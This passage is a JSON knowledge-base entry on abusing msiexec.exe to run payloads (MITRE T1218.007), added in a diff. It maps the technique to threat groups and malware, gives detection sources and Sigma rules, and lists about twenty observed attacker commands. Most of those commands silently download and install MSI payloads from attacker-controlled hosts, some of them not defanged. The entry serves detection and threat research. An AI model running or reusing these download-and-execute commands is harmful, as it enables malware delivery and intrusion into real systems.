@@ -1,0 +1,2029 @@
+{
+  "type": "lolbin-details",
+  "version": 2,
+  "id": "3f679076-cee5-4136-a719-b33182c4b71e",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-17T20:13:00.000Z",
+  "modified": "2026-10-17T20:13:00.000Z",
+  "name": "Msiexec.exe",
+  "image": "msiexec.exe",
+  "description": "Used by Windows to execute msi files",
+  "attack": {
+    "id": "T1218.007",
+    "name": "Msiexec",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1218/007",
+    "version": "20.0"
+  },
+  "summary": [
+    "Proxy execution of malicious payloads",
+    "Launch local or network accessible MSI files",
+    "Execute DLLs",
+    "Bypass application control solutions"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\System32\\msiexec.exe",
+    "C:\\Windows\\SysWOW64\\msiexec.exe"
+  ],
+  "hashes": {
+    "MD5": "F3ED0A5EF547D0FB911158D56EF7E27F"
+  },
+  "capabilities": [
+    "Execute"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0005:Stealth:T1218.007"
+  ],
+  "techniques": [
+    {
+      "id": "T1218.007",
+      "name": "Msiexec",
+      "url": "https://attack.mitre.org/techniques/T1218/007",
+      "tactics": [
+        "Stealth"
+      ]
+    }
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT38",
+        "attack_id": "G0082",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Machete",
+        "attack_id": "G0095",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Molerats",
+        "attack_id": "G0021",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Rancor",
+        "attack_id": "G0075",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "TA505",
+        "attack_id": "G0092",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "ZIRCONIUM",
+        "attack_id": "G0128",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "3CX Supply Chain Attack",
+        "attack_id": "C0057",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "RedDelta Modified PlugX Infection Chain Operations",
+        "attack_id": "C0047",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "AppleJeus",
+        "attack_id": "S0584",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "Chaes",
+        "attack_id": "S0631",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "Clop",
+        "attack_id": "S0611",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "DEADEYE",
+        "attack_id": "S1052",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Duqu",
+        "attack_id": "S0038",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "FlawedAmmyy",
+        "attack_id": "S0381",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Grandoreiro",
+        "attack_id": "S0531",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "IcedID",
+        "attack_id": "S0483",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Javali",
+        "attack_id": "S0528",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "Latrodectus",
+        "attack_id": "S1160",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "LoudMiner",
+        "attack_id": "S0451",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "Maze",
+        "attack_id": "S0449",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Melcoz",
+        "attack_id": "S0530",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "Metamorfo",
+        "attack_id": "S0455",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Mispadu",
+        "attack_id": "S1122",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "QakBot",
+        "attack_id": "S0650",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Ragnar Locker",
+        "attack_id": "S0481",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "Raspberry Robin",
+        "attack_id": "S1130",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      },
+      {
+        "name": "RedLine Stealer",
+        "attack_id": "S1240",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      },
+      {
+        "name": "Tsundere Botnet",
+        "attack_id": "S9034",
+        "evidence": [
+          "uses T1218.007"
+        ]
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "RemoteUtilities",
+        "attack_id": "S0592",
+        "evidence": [
+          "uses T1218.007",
+          "names msiexec.exe"
+        ]
+      }
+    ],
+    "technique_only": [],
+    "attack_relationships": [
+      {
+        "source": "APT38",
+        "type": "intrusion-set",
+        "attack_id": "G0082",
+        "description": "APT38 has used `msiexec.exe` to execute malicious files.",
+        "citations": [
+          {
+            "source_name": "1 - appv",
+            "url": "https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+          }
+        ]
+      },
+      {
+        "source": "Machete",
+        "type": "intrusion-set",
+        "attack_id": "G0095",
+        "description": "Machete has used msiexec to install the Machete malware.",
+        "citations": [
+          {
+            "source_name": "360 Machete Sep 2020",
+            "url": "https://blog.360totalsecurity.com/en/apt-c-43-steals-venezuelan-military-secrets-to-provide-intelligence-support-for-the-reactionaries-hpreact-campaign/"
+          }
+        ]
+      },
+      {
+        "source": "Molerats",
+        "type": "intrusion-set",
+        "attack_id": "G0021",
+        "description": "Molerats has used msiexec.exe to execute an MSI payload.",
+        "citations": [
+          {
+            "source_name": "Unit42 Molerat Mar 2020",
+            "url": "https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/"
+          }
+        ]
+      },
+      {
+        "source": "Rancor",
+        "type": "intrusion-set",
+        "attack_id": "G0075",
+        "description": "Rancor has used msiexec to download and execute malicious installer files over HTTP.",
+        "citations": [
+          {
+            "source_name": "Rancor Unit42 June 2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+          }
+        ]
+      },
+      {
+        "source": "TA505",
+        "type": "intrusion-set",
+        "attack_id": "G0092",
+        "description": "TA505 has used msiexec to download and execute malicious Windows Installer files.",
+        "citations": [
+          {
+            "source_name": "Trend Micro TA505 June 2019",
+            "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+          },
+          {
+            "source_name": "Cybereason TA505 April 2019",
+            "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+          },
+          {
+            "source_name": "Deep Instinct TA505 Apr 2019",
+            "url": "https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+          }
+        ]
+      },
+      {
+        "source": "ZIRCONIUM",
+        "type": "intrusion-set",
+        "attack_id": "G0128",
+        "description": "ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.",
+        "citations": [
+          {
+            "source_name": "Zscaler APT31 Covid-19 October 2020",
+            "url": "https://www.zscaler.com/blogs/security-research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online"
+          }
+        ]
+      },
+      {
+        "source": "3CX Supply Chain Attack",
+        "type": "campaign",
+        "attack_id": "C0057",
+        "description": "During the 3CX Supply Chain Attack, AppleJeus delivered components using a Windows Installer package (.msi). The MSI installer extracted several files and executed the 3CXDesktopApp.exe, which loaded the malicious library file ffmpeg.dll.",
+        "citations": [
+          {
+            "source_name": "Unit42 3cx supply chain 2023",
+            "url": "https://unit42.paloaltonetworks.com/3cxdesktopapp-supply-chain-attack/"
+          }
+        ]
+      },
+      {
+        "source": "RedDelta Modified PlugX Infection Chain Operations",
+        "type": "campaign",
+        "attack_id": "C0047",
+        "description": "Mustang Panda initial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation of PlugX during RedDelta Modified PlugX Infection Chain Operations.",
+        "citations": [
+          {
+            "source_name": "Recorded Future RedDelta 2025",
+            "url": "https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf"
+          }
+        ]
+      },
+      {
+        "source": "AppleJeus",
+        "type": "malware",
+        "attack_id": "S0584",
+        "description": "AppleJeus has been installed via MSI installer.",
+        "citations": [
+          {
+            "source_name": "CISA AppleJeus Feb 2021",
+            "url": "https://us-cert.cisa.gov/ncas/alerts/aa21-048a"
+          }
+        ]
+      },
+      {
+        "source": "Chaes",
+        "type": "malware",
+        "attack_id": "S0631",
+        "description": "Chaes has used.MSI files as an initial way to start the infection chain.",
+        "citations": [
+          {
+            "source_name": "Cybereason Chaes Nov 2020",
+            "url": "https://www.cybereason.com/hubfs/dam/collateral/reports/11-2020-Chaes-e-commerce-malware-research.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Clop",
+        "type": "malware",
+        "attack_id": "S0611",
+        "description": "Clop can use msiexec.exe to disable security tools on the system.",
+        "citations": [
+          {
+            "source_name": "Cybereason Clop Dec 2020",
+            "url": "https://www.cybereason.com/blog/cybereason-vs.-clop-ransomware"
+          }
+        ]
+      },
+      {
+        "source": "DEADEYE",
+        "type": "malware",
+        "attack_id": "S1052",
+        "description": "DEADEYE can use `msiexec.exe` for execution of malicious DLL.",
+        "citations": [
+          {
+            "source_name": "Mandiant APT41",
+            "url": "https://www.mandiant.com/resources/apt41-us-state-governments"
+          }
+        ]
+      },
+      {
+        "source": "Duqu",
+        "type": "malware",
+        "attack_id": "S0038",
+        "description": "Duqu has used msiexec to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.",
+        "citations": [
+          {
+            "source_name": "Kaspersky Duqu 2.0",
+            "url": "https://web.archive.org/web/20150906233433/https://securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf"
+          }
+        ]
+      },
+      {
+        "source": "FlawedAmmyy",
+        "type": "malware",
+        "attack_id": "S0381",
+        "description": "FlawedAmmyy has been installed via `msiexec.exe`.",
+        "citations": [
+          {
+            "source_name": "Korean FSI TA505 2020",
+            "url": "https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+          }
+        ]
+      },
+      {
+        "source": "Grandoreiro",
+        "type": "malware",
+        "attack_id": "S0531",
+        "description": "Grandoreiro can use MSI files to execute DLLs.",
+        "citations": [
+          {
+            "source_name": "Securelist Brazilian Banking Malware July 2020",
+            "url": "https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+          }
+        ]
+      },
+      {
+        "source": "IcedID",
+        "type": "malware",
+        "attack_id": "S0483",
+        "description": "IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. IcedID has also used msiexec.exe to deploy the IcedID loader.",
+        "citations": [
+          {
+            "source_name": "Trendmicro_IcedID",
+            "url": "https://www.trendmicro.com/en_us/research/22/l/icedid-botnet-distributors-abuse-google-ppc-to-distribute-malware.html"
+          },
+          {
+            "source_name": "Juniper IcedID June 2020",
+            "url": "https://blogs.juniper.net/en-us/threat-research/covid-19-and-fmla-campaigns-used-to-install-new-icedid-banking-malware"
+          }
+        ]
+      },
+      {
+        "source": "Javali",
+        "type": "malware",
+        "attack_id": "S0528",
+        "description": "Javali has used the MSI installer to download and execute malicious payloads.",
+        "citations": [
+          {
+            "source_name": "Securelist Brazilian Banking Malware July 2020",
+            "url": "https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+          }
+        ]
+      },
+      {
+        "source": "Latrodectus",
+        "type": "malware",
+        "attack_id": "S1160",
+        "description": "Latrodectus has called `msiexec` to install remotely-hosted MSI files.",
+        "citations": [
+          {
+            "source_name": "Bleeping Computer Latrodectus April 2024",
+            "url": "https://www.bleepingcomputer.com/news/security/new-latrodectus-malware-attacks-use-microsoft-cloudflare-themes/"
+          },
+          {
+            "source_name": "Latrodectus APR 2024",
+            "url": "https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice"
+          }
+        ]
+      },
+      {
+        "source": "LoudMiner",
+        "type": "malware",
+        "attack_id": "S0451",
+        "description": "LoudMiner used an MSI installer to install the virtualization software.",
+        "citations": [
+          {
+            "source_name": "ESET LoudMiner June 2019",
+            "url": "https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/"
+          }
+        ]
+      },
+      {
+        "source": "Maze",
+        "type": "malware",
+        "attack_id": "S0449",
+        "description": "Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec.",
+        "citations": [
+          {
+            "source_name": "Sophos Maze VM September 2020",
+            "url": "https://news.sophos.com/en-us/2020/09/17/maze-attackers-adopt-ragnar-locker-virtual-machine-technique/"
+          }
+        ]
+      },
+      {
+        "source": "Melcoz",
+        "type": "malware",
+        "attack_id": "S0530",
+        "description": "Melcoz can use MSI files with embedded VBScript for execution.",
+        "citations": [
+          {
+            "source_name": "Securelist Brazilian Banking Malware July 2020",
+            "url": "https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+          }
+        ]
+      },
+      {
+        "source": "Metamorfo",
+        "type": "malware",
+        "attack_id": "S0455",
+        "description": "Metamorfo has used MsiExec.exe to automatically execute files.",
+        "citations": [
+          {
+            "source_name": "Fortinet Metamorfo Feb 2020",
+            "url": "https://www.fortinet.com/blog/threat-research/another-metamorfo-variant-targeting-customers-of-financial-institutions"
+          },
+          {
+            "source_name": "ESET Casbaneiro Oct 2019",
+            "url": "https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/"
+          }
+        ]
+      },
+      {
+        "source": "Mispadu",
+        "type": "malware",
+        "attack_id": "S1122",
+        "description": "Mispadu has been installed via MSI installer.",
+        "citations": [
+          {
+            "source_name": "ESET Security Mispadu Facebook Ads 2019",
+            "url": "https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/"
+          },
+          {
+            "source_name": "SCILabs Malteiro 2021",
+            "url": "https://blog.scilabs.mx/en/cyber-threat-profile-malteiro/"
+          }
+        ]
+      },
+      {
+        "source": "QakBot",
+        "type": "malware",
+        "attack_id": "S0650",
+        "description": "QakBot can use MSIExec to spawn multiple cmd.exe processes.",
+        "citations": [
+          {
+            "source_name": "Crowdstrike Qakbot October 2020",
+            "url": "https://www.crowdstrike.com/blog/duck-hunting-with-falcon-complete-qakbot-zip-based-campaign/"
+          }
+        ]
+      },
+      {
+        "source": "Ragnar Locker",
+        "type": "malware",
+        "attack_id": "S0481",
+        "description": "Ragnar Locker has been delivered as an unsigned MSI package that was executed with msiexec.exe.",
+        "citations": [
+          {
+            "source_name": "Sophos Ragnar May 2020",
+            "url": "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/"
+          }
+        ]
+      },
+      {
+        "source": "Raspberry Robin",
+        "type": "malware",
+        "attack_id": "S1130",
+        "description": "Raspberry Robin uses msiexec.exe for post-installation communication to command and control infrastructure. Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution.",
+        "citations": [
+          {
+            "source_name": "TrendMicro RaspberryRobin 2022",
+            "url": "https://www.trendmicro.com/en_us/research/22/l/raspberry-robin-malware-targets-telecom-governments.html"
+          },
+          {
+            "source_name": "RedCanary RaspberryRobin 2022",
+            "url": "https://redcanary.com/blog/threat-intelligence/raspberry-robin/"
+          }
+        ]
+      },
+      {
+        "source": "Raspberry Robin",
+        "type": "malware",
+        "attack_id": "S1130",
+        "description": "Raspberry Robin retrieves its second stage payload in a variety of ways such as through msiexec.exe abuse, or running the curl command to download the payload to the victim's %AppData% folder.",
+        "citations": [
+          {
+            "source_name": "RedCanary RaspberryRobin 2022",
+            "url": "https://redcanary.com/blog/threat-intelligence/raspberry-robin/"
+          },
+          {
+            "source_name": "HP RaspberryRobin 2024",
+            "url": "https://threatresearch.ext.hp.com/raspberry-robin-now-spreading-through-windows-script-files/"
+          }
+        ]
+      },
+      {
+        "source": "RedLine Stealer",
+        "type": "malware",
+        "attack_id": "S1240",
+        "description": "RedLine Stealer has been installed via MSI Installer.",
+        "citations": [
+          {
+            "source_name": "McAfee RedLine Stealer April 2024",
+            "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/redline-stealer-a-novel-approach/"
+          }
+        ]
+      },
+      {
+        "source": "Tsundere Botnet",
+        "type": "malware",
+        "attack_id": "S9034",
+        "description": "Tsundere Botnet has been distributed via an MSI installer.",
+        "citations": [
+          {
+            "source_name": "SecureListUbiedo_Tsundere_Nov2025",
+            "url": "https://securelist.com/tsundere-node-js-botnet-uses-ethereum-blockchain/117979/"
+          }
+        ]
+      },
+      {
+        "source": "RemoteUtilities",
+        "type": "tool",
+        "attack_id": "S0592",
+        "description": "RemoteUtilities can use Msiexec to install a service.",
+        "citations": [
+          {
+            "source_name": "Trend Micro Muddy Water March 2021",
+            "url": "https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html"
+          }
+        ]
+      }
+    ],
+    "associated_commands": [
+      {
+        "command": "msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]",
+        "intent": "After the Office equation editor exploit runs, the command downloads an installer package (.msi) and installs it; the package drops the backdoor installer UserInstall.exe.",
+        "status": "verified",
+        "source_name": "Trend Micro Tropic Trooper March 2018",
+        "source_url": "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"
+      },
+      {
+        "command": "cmd.exe /c msiexec /q /I “hxxps[:]//www[.]uwaoma[.]info/zus.msi",
+        "intent": "Exploitation of CVE-2017-11882 leads to download and installation of the malicious MSI package zus.msi through Windows Installer, which delivers LokiBot.",
+        "status": "verified",
+        "source_name": "Trend Micro LokiBot Windows Installer February 2018",
+        "source_url": "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/"
+      },
+      {
+        "command": "msiexec /q /i http://199.247.6[.]253/ud",
+        "intent": "A VBScript written by cmd runs msiexec to download and install a second stage payload from the attacker server.",
+        "status": "verified",
+        "source_name": "Unit 42 Rancor June 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "command": "msiexec /q /i http://p=/45.125.65[.]76/abc",
+        "intent": "The VBS file written by the macro downloads a second-stage MSI payload from the attacker server and executes it with msiexec.",
+        "status": "verified",
+        "source_name": "Check Point Rancor Year of the Phish September 2019",
+        "source_url": "https://research.checkpoint.com/2019/rancor-the-year-of-the-phish/"
+      },
+      {
+        "command": "%comspec% /c taskkill /F /IM msiexec.exe & ping 127.0.0.1 -n 2 >NUL & msiexec /i C:\\ProgramData\\PlayerVLC.msi /quiet /qn /norestart",
+        "intent": "The secondary VBScript kills running msiexec.exe instances, waits two seconds with ping, then launches the downloaded PlayerVLC.msi with msiexec.",
+        "status": "verified",
+        "source_name": "Unit 42 Molerats Spark March 2020",
+        "source_url": "https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\msiexec.exe\" back=13 error=continue /i http://92[.]38[.]135[.]99/99.msi /q OnLoad=\"c:\\windows\\notepad.exe",
+        "intent": "The final command of the document macro downloads and installs the .MSI file, a downloader that retrieves and runs the FlawedAmmyy RAT.",
+        "status": "verified",
+        "source_name": "Trend Micro TA505 August 2019",
+        "source_url": "https://www.trendmicro.com/en_us/research/19/h/ta505-at-it-again-variety-is-the-spice-of-servhelper-and-flawedammyy.html"
+      },
+      {
+        "command": "cmd /c cd /d C:\\inetpub\\wwwroot\\aspnet_client&msiexec /q /i http://103.212.223.210:9900/nvidia.msi&echo [S]&cd&echo [E]",
+        "intent": "Second-stage payload retrieval command sent through a China Chopper web shell on a compromised Exchange server.",
+        "status": "verified",
+        "source_name": "Rapid7 Exchange Zero-Day Attacker Behavior March 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\\Pass.txt & start %APPDATA%\\Pass.txt && FOR %i IN (%systemroot%\\system32\\msiexec.*) DO msiexec -c /Q /i hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd",
+        "intent": "Run when the victim opens the shortcut file; it opens the decoy password file and uses msiexec to silently launch the fetched Windows Installer file.",
+        "status": "verified",
+        "source_name": "Kaspersky BlueNoroff MotW Bypass December 2022",
+        "source_url": "https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+      },
+      {
+        "command": "msiexec /i %appdata%\\y.msi /qn",
+        "intent": "After the LNK downloads the MSI with PowerShell and renames it to y.msi, it is installed with msiexec.",
+        "status": "verified",
+        "source_name": "Netskope Bumblebee Resurgence October 2024",
+        "source_url": "https://www.netskope.com/blog/new-bumblebee-loader-infection-chain-signals-possible-resurgence"
+      },
+      {
+        "command": "mSIexeC -Q -IhTtP://NT3[.]XyZ:8080/ [11 char long random string] / [computer name] = [username]",
+        "intent": "After delivery, cmd.exe spawns msiexec.exe in quiet mode to download the Raspberry Robin payload, with mixed case letters to bypass detection.",
+        "status": "verified",
+        "source_name": "Cisco Raspberry Robin August 2022",
+        "source_url": "https://blogs.cisco.com/security/raspberry-robin-highly-evasive-worm-spreads-over-external-disks"
+      },
+      {
+        "command": "mSIExec /Q /IhTTP://0Dz[.]Me:8080/ [11 char long random string] / [computer name] = [username]",
+        "intent": "Another mixed-case variant of the quiet msiexec command used to download the Raspberry Robin payload.",
+        "status": "verified",
+        "source_name": "Cisco Raspberry Robin August 2022",
+        "source_url": "https://blogs.cisco.com/security/raspberry-robin-highly-evasive-worm-spreads-over-external-disks"
+      },
+      {
+        "command": "curl -sL \"http://[actor-controlled-ip]/installer\" -o \"SuperOps.msi\" && msiexec /i \"SuperOps.msi\" /quiet",
+        "intent": "Example staging string observed in UNC3753 remote sessions to download and silently install a SuperOps remote management MSI.",
+        "status": "verified",
+        "source_name": "Google Mandiant UNC3753 US Law Firms June 2026",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\cmd.exe\" /c cd /d C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\ & copy c:\\windows\\system32\\curl.exe KFSELqcUm.exe & KFSELqcUm.exe -o qgEYlIKPDYzj.msi https[:]//pittsburgh.soulcarelife[.]org/?sxykn3bjp0rmnaefzc8jb3qc2704 & C:\\Windows\\System32\\msiexec.exe /i qgEYlIKPDYzj.msi /qn",
+        "intent": "Delivery chain 1: a renamed cURL downloads a Windows Installer package that is executed with msiexec.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2975 Malvertising December 2023",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/detecting-disrupting-malvertising-backdoors"
+      },
+      {
+        "command": "msiexec /i C:\\programData\\Y9U68YA55.bin /qn",
+        "intent": "Delivery chain 3: Windows Script Host downloads a Windows Installer package that is run with msiexec.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2975 Malvertising December 2023",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/detecting-disrupting-malvertising-backdoors"
+      },
+      {
+        "command": "msiexec /q /i hxxps://vdfccjpnedujhrzscjtq[.]supabase[.]co/storage/v1/object/public/image/v4.msi",
+        "intent": "On the compromised SharePoint server, w3wp.exe spawned msiexec.exe to silently download and install a remote MSI payload.",
+        "status": "verified",
+        "source_name": "Trend Micro Warlock Attack March 2026",
+        "source_url": "https://www.trendmicro.com/en_us/research/26/c/dissecting-a-warlock-attack.html"
+      },
+      {
+        "command": "C:\\windows\\system32\\msiexec.exe /i hxxps[://www[.tightvnc[.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit[.msi /q /norestart ADDLOCAL=Server SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=[REDACTED]",
+        "intent": "PsExec was used to run msiexec so that TightVNC was downloaded and installed from a remote location.",
+        "status": "verified",
+        "source_name": "Trend Micro Warlock Attack March 2026",
+        "source_url": "https://www.trendmicro.com/en_us/research/26/c/dissecting-a-warlock-attack.html"
+      },
+      {
+        "command": "msiexec /i https://onlineview365[.]com/propi.msi /quiet /norestart",
+        "intent": "The downloaded PIF file only invokes msiexec to download and execute an MSI installer hosted on an attacker-registered web address.",
+        "status": "verified",
+        "source_name": "Huntress DarkMe RAT September 2026",
+        "source_url": "https://www.huntress.com/blog/darkme-rat-abandons-exploits"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cmd.exe /c msiexec.exe /q /i https[:]//aeroclubofindia[.]co[.]in/css/NCERT-Whatsapp-Advisory/winc",
+        "intent": "The deobfuscated shortcut command downloads and installs an MSI payload from a remote server.",
+        "status": "verified",
+        "source_name": "CYFIRMA APT36 LNK MSI December 2025",
+        "source_url": "https://www.cyfirma.com/research/apt36-lnk-based-malware-campaign-leveraging-msi-payload-delivery/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\msiexec.exe\" step=six done=false /i http://local365office.com/content /q change=false",
+        "intent": "The macro in the phishing document runs this command; /q makes msiexec run in the background while it downloads and loads an MSI binary.",
+        "status": "verified",
+        "source_name": "Cyberint Retailers Spear-Phishing December 2018",
+        "source_url": "https://e.cyberint.com/hubfs/CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf"
+      },
+      {
+        "command": "msiexec.exe next=back error=shutdown /i http://office365onlinehome.com/host32 /q OnChange=\"c:\\windows\\system32\"",
+        "intent": "A second malicious document runs similar msiexec command line artifacts that download an MSI installer from office365onlinehome.com.",
+        "status": "verified",
+        "source_name": "Cyberint Retailers Spear-Phishing December 2018",
+        "source_url": "https://e.cyberint.com/hubfs/CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf"
+      }
+    ]
+  },
+  "detections": {
+    "event_ids": {
+      "WinEventLog:Security": [
+        {
+          "event_id": 4688,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1218.007"
+          ]
+        }
+      ],
+      "WinEventLog:Sysmon": [
+        {
+          "event_id": 3,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1218.007"
+          ]
+        },
+        {
+          "event_id": 7,
+          "data_components": [
+            "Module Load"
+          ],
+          "techniques": [
+            "T1218.007"
+          ]
+        },
+        {
+          "event_id": 22,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1218.007"
+          ]
+        }
+      ]
+    },
+    "other_log_sources": [],
+    "attack_detection_strategies": [
+      {
+        "technique": "T1218.007",
+        "id": "DET0158",
+        "name": "Detection of Msiexec Abuse for Local, Network, and DLL Execution",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0158",
+        "analytics": [
+          {
+            "id": "AN0445",
+            "description": "Detection of msiexec.exe execution where command-line arguments reference remote MSI packages, UNC paths, HTTP/HTTPS URLs, or DLLs, correlated with subsequent module loads and/or network connections to previously unseen destinations. The behavioral chain links process creation of msiexec.exe with suspicious parameters, network activity to retrieve payloads, and module loading indicative of malicious installation or DLL execution.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4688"
+              },
+              {
+                "data_component": "Module Load",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=7"
+              },
+              {
+                "data_component": "Network Connection Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=3, 22"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Msiexec.EXE Initiated Network Connection Over HTTP",
+        "id": "8e5e38e4-5350-4c0b-895a-e872ce0dd54f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/network_connection/net_connection_win_msiexec_http.yml",
+        "level": "low",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.007"
+        ]
+      },
+      {
+        "title": "DllUnregisterServer Function Call Via Msiexec.EXE",
+        "id": "84f52741-8834-4a8c-a413-2eb2269aa6c8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msiexec_dll.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
